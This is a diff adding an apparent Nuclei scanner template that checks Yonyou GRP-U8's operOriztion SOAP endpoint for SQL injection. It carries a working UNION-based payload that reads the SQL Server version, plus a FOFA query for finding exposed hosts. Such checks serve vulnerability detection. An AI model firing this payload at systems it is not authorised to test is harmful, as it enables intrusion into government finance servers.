@@ -1,0 +1,36 @@
+id: yonyou-grp-u8-operoriztion-sqli
+
+info:
+  name: 用友GRP-U8 operOriztion SQL注入漏洞
+  author: unknow
+  severity: high
+  description: 用友GRP-U8是面向政府及行政事业单位的财政管理应用。在/services/operOriztion接口处存在SQL注入漏洞。
+  tags: yongyou,sqli
+  metadata:
+    fofa-qeury: app="用友-GRP-U8"
+
+http:
+  - raw:
+      - |              
+        POST /services/operOriztion HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: ""
+        Content-Length: 477
+        
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <kjnd xsi:type="xsd:string">' UNION ALL SELECT @@version --</kjnd>
+        </wsdd:getGsbmfaByKjnd>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        
+              
+    matchers:     
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body, "Microsoft SQL Server")
+
